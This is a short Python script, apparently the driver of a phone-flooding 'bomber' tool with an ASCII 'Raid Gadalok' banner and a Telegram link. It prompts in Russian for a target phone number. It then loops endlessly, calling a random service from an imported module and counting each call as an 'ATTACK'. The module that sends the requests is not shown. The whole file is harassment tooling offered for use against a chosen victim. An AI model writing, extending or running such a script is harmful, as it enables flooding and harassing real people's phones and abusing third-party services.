import sys
import os
from StructService import Distribution_Service
from config import attack

attack_number_phone = Distribution_Service()
try:
    os.system('cls')
except:
    os.system('clear')
print('''\033[32m 
██████╗░░█████╗░██╗██████╗░  ░██████╗░░█████╗░██████╗░░█████╗░██╗░░░░░░█████╗░██╗░░██╗
██╔══██╗██╔══██╗██║██╔══██╗  ██╔════╝░██╔══██╗██╔══██╗██╔══██╗██║░░░░░██╔══██╗██║░██╔╝
██████╔╝███████║██║██║░░██║  ██║░░██╗░███████║██║░░██║███████║██║░░░░░██║░░██║█████═╝░
██╔══██╗██╔══██║██║██║░░██║  ██║░░╚██╗██╔══██║██║░░██║██╔══██║██║░░░░░██║░░██║██╔═██╗░
██║░░██║██║░░██║██║██████╔╝  ╚██████╔╝██║░░██║██████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░  ░╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝
\033[31m https://t.me/rayd_gadalok
\033[37m
    ''')

target = input('Телефон: ')

try:
    attack_number_phone.phone(target)
except Exception as error:
    print(f'Невалил, попробуйте что то типа - Телефон - +7666666666')
    sys.exit()

while True:
    try:
        attack_number_phone.random_service()
        attack += 1
        try:
            os.system('cls')
        except:
            os.system('clear')
        print(f'''ATTACK -> {attack}''')
    except Exception:
        pass

#
